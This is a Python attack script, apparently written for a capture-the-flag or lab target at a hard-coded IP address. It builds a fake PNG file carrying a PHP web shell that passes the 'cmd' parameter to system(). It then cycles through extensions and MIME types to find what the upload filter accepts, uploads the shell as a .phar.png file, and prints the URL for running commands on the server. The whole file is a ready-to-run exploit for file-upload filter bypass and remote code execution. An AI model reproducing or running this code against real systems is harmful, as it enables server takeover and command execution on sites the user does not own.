import requests
import os
import io
from datetime import datetime

# ========== Configuration ==========
URL = "http://94.237.60.55:38666/contact/upload.php"  # Change to actual target upload URL
UPLOAD_FIELD = "uploadFile"
PROXIES = {
    "http": "http://127.0.0.1:8080",   # Set Burp proxy
    "https": "http://127.0.0.1:8080"
}
USE_PROXY = False  # Set to False to disable Burp proxy

# ========== Helpers ==========

def build_payload():
    """Create a valid PNG file with PHP payload on a new line."""
    png_header = b"\x89PNG\r\n\x1a\n"  # PNG signature
    ihdr_chunk = b"\x00\x00\x00\rIHDR" + os.urandom(13)  # Fake IHDR
    php_payload = b"\n<?php system($_GET['cmd']); ?>"
    
    final_data = png_header + ihdr_chunk + php_payload
    return final_data

def try_upload(extension, content_type):
    """Try uploading with given extension and content type."""
    filename = f"test.{extension}"
    file_data = build_payload()

    files = {
        UPLOAD_FIELD: (filename, io.BytesIO(file_data), content_type)
    }

    try:
        response = requests.post(URL, files=files, proxies=PROXIES if USE_PROXY else None, verify=False)
        print(f"[+] Tried: {filename} ({content_type}) => {response.status_code} | {response.text[:100]}")
        return response.text
    except Exception as e:
        print(f"[-] Error uploading: {e}")

def enumerate_allowed():
    """Enumerate allowed extensions and MIME types."""
    extensions = ["png", "jpeg", "jpg", "gif", "svg", "phar.png"]
    content_types = [
        "image/png",
        "image/jpeg",
        "image/gif",
        "image/svg+xml",
        "application/octet-stream"
    ]
    
    print("[*] Enumerating combinations...")
    for ext in extensions:
        for ctype in content_types:
            try_upload(ext, ctype)

def upload_shell():
    """Upload final payload with .phar.png and valid PNG header."""
    now = datetime.now().strftime('%y%m%d')
    filename = f"{now}_test.phar.png"
    payload = build_payload()

    files = {
        UPLOAD_FIELD: (filename, io.BytesIO(payload), "image/png")
    }

    print(f"[*] Uploading final payload: {filename}")
    response = requests.post(URL, files=files, proxies=PROXIES if USE_PROXY else None, verify=False)
    print(f"[+] Server response: {response.status_code}")
    print(response.text[:300])

    print(f"[!] If successful, try accessing: /user_feedback_submissions/{filename}?cmd=uptime")

# ========== Main ==========

if __name__ == "__main__":
    print("[*] Starting enumeration...")
    enumerate_allowed()

    #input("\n[>] Press Enter to upload final shell...\n")
    upload_shell()
